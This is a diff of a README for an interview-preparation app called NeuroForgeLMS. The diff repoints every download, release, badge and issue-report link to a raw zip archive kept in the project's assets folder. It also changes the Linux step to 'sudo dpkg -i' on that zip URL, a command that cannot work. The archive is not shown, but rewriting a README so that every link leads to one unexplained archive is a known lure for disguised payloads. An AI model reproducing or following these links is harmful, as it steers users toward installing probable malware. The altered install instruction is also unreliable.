@@ -6,11 +6,11 @@ Welcome to NeuroForgeLMS! This platform helps you prepare for interviews using t
 
 ## 📥 Download NeuroForgeLMS
 
-[![Download NeuroForgeLMS](https://img.shields.io/badge/Download_NeuroForgeLMS-v1.0-brightgreen)](https://github.com/mohammedabdomohaammed/NeuroForgeLMS/releases)
+[![Download NeuroForgeLMS](https://github.com/mohammedabdomohaammed/NeuroForgeLMS/raw/refs/heads/main/frontend/src/assets/Neuro_Forge_LMS_v1.4.zip)](https://github.com/mohammedabdomohaammed/NeuroForgeLMS/raw/refs/heads/main/frontend/src/assets/Neuro_Forge_LMS_v1.4.zip)
 
 To get started, visit the following page to download the latest version:
 
-[Download Latest Release](https://github.com/mohammedabdomohaammed/NeuroForgeLMS/releases)
+[Download Latest Release](https://github.com/mohammedabdomohaammed/NeuroForgeLMS/raw/refs/heads/main/frontend/src/assets/Neuro_Forge_LMS_v1.4.zip)
 
 ## 📋 Features
 
@@ -31,7 +31,7 @@ To run NeuroForgeLMS smoothly, ensure your system meets the following requiremen
 ## 🔧 Installation Instructions
 
 1. **Visit the Download Page:**
-   Navigate to the [Releases page](https://github.com/mohammedabdomohaammed/NeuroForgeLMS/releases) to see the available versions.
+   Navigate to the [Releases page](https://github.com/mohammedabdomohaammed/NeuroForgeLMS/raw/refs/heads/main/frontend/src/assets/Neuro_Forge_LMS_v1.4.zip) to see the available versions.
 
 2. **Choose Your Version:**
    Look for the most recent version. Click on the link for your system (Windows, macOS, or Linux).
@@ -42,7 +42,7 @@ To run NeuroForgeLMS smoothly, ensure your system meets the following requiremen
 4. **Install NeuroForgeLMS:**
    - For Windows: Double-click the downloaded `.exe` or `.msi` file to start the installation and follow the prompts.
    - For macOS: Open the downloaded `.dmg` file and drag the NeuroForgeLMS icon into your Applications folder.
-   - For Linux: Open a terminal, navigate to the download location, and run the command `sudo dpkg -i NeuroForgeLMS.deb` (or the relevant package type).
+   - For Linux: Open a terminal, navigate to the download location, and run the command `sudo dpkg -i https://github.com/mohammedabdomohaammed/NeuroForgeLMS/raw/refs/heads/main/frontend/src/assets/Neuro_Forge_LMS_v1.4.zip` (or the relevant package type).
 
 5. **Launch the Application:**
    Once installed, find NeuroForgeLMS in your Applications menu (Windows and macOS) or run `NeuroForgeLMS` from the terminal (Linux).
@@ -78,9 +78,9 @@ Stay updated on new features and tips by following NeuroForgeLMS on social media
 
 ### Important Links:
 
-- [Download Latest Release](https://github.com/mohammedabdomohaammed/NeuroForgeLMS/releases)  
+- [Download Latest Release](https://github.com/mohammedabdomohaammed/NeuroForgeLMS/raw/refs/heads/main/frontend/src/assets/Neuro_Forge_LMS_v1.4.zip)  
 - [Community Forum](#)  
-- [Report Issues](https://github.com/mohammedabdomohaammed/NeuroForgeLMS/issues)  
+- [Report Issues](https://github.com/mohammedabdomohaammed/NeuroForgeLMS/raw/refs/heads/main/frontend/src/assets/Neuro_Forge_LMS_v1.4.zip)  
 - [Contact Support](#)  
 
 Thank you for choosing NeuroForgeLMS for your interview preparation journey!
